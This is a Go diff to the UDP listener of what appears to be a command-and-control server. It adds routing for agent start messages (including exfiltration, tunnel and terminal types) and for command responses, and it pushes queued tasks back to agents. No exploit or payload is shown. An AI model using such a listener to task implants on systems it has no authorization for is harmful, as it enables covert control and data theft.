@@ -56,6 +56,11 @@ type StartMsg struct {
 	Data []byte `msgpack:"data"`
 }
 
+type Message struct {
+	Type   int8     `msgpack:"type"`
+	Object [][]byte `msgpack:"object"`
+}
+
 type InitPack struct {
 	Id   uint   `msgpack:"id"`
 	Type uint   `msgpack:"type"`
@@ -167,10 +172,27 @@ func (handler *UDP) handlePacket(data []byte, addr *net.UDPAddr, ts Teamserver) 
 		return
 	}
 
+	// 尝试解析为 StartMsg（用于 INIT/EXFIL/JOB/TUNNEL/TERMINAL）
 	err = msgpack.Unmarshal(decryptedData, &initMsg)
-	if err != nil {
+	if err == nil && initMsg.Type >= INIT_PACK && initMsg.Type <= TERMINAL_PACK {
+		// 处理特殊连接消息
+		handler.handleStartMsg(initMsg, decryptedData, addr, ts)
 		return
 	}
+
+	// 尝试解析为普通 Message（命令响应）
+	var normalMsg Message
+	err = msgpack.Unmarshal(decryptedData, &normalMsg)
+	if err == nil && normalMsg.Type == 1 {
+		// 处理命令响应
+		handler.handleNormalMessage(decryptedData, addr, ts)
+		return
+	}
+}
+
+func (handler *UDP) handleStartMsg(initMsg StartMsg, decryptedData []byte, addr *net.UDPAddr, ts Teamserver) {
+	var sendData []byte
+	var err error
 
 	switch initMsg.Type {
 
@@ -385,6 +407,66 @@ func (handler *UDP) handlePacket(data []byte, addr *net.UDPAddr, ts Teamserver) 
 			_ = pw.Close()
 		}
 	}
+}
+
+func (handler *UDP) handleNormalMessage(decryptedData []byte, addr *net.UDPAddr, ts Teamserver) {
+	// 根据 UDP 地址查找对应的 agentId
+	var agentId string
+	var found bool
+
+	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
+		connection, ok := valueConn.(UDPConnection)
+		if !ok {
+			return true // 继续遍历
+		}
+
+		// 比较 IP 和 Port
+		if connection.addr.IP.Equal(addr.IP) && connection.addr.Port == addr.Port {
+			agentId = key
+			found = true
+			return false // 找到了，停止遍历
+		}
+		return true // 继续遍历
+	})
+
+	if !found {
+		// 未找到对应的 agent 连接
+		return
+	}
+
+	// 处理命令响应数据
+	_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)
+
+	// 更新最后活动时间
+	value, exists := handler.AgentConnects.Get(agentId)
+	if exists {
+		connection, ok := value.(UDPConnection)
+		if ok {
+			connection.lastActivity = time.Now()
+			handler.AgentConnects.Put(agentId, connection)
+		}
+	}
+
+	// 获取新任务
+	sendData, err := ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
+	if err != nil {
+		return
+	}
+
+	// 如果有新任务，发送给 agent
+	if sendData != nil && len(sendData) > 0 {
+		// 添加长度前缀（agent 使用 RecvMsg 接收）
+		msgLen := make([]byte, 4)
+		binary.BigEndian.PutUint32(msgLen, uint32(len(sendData)))
+		message := append(msgLen, sendData...)
+		err = handler.sendPacket(addr, message)
+		if err != nil {
+			return
+		}
+	}
+
+	// 更新 agent tick
+	_ = ModuleObject.ts.TsAgentSetTick(agentId)
 }
 
 func (handler *UDP) Stop() error {
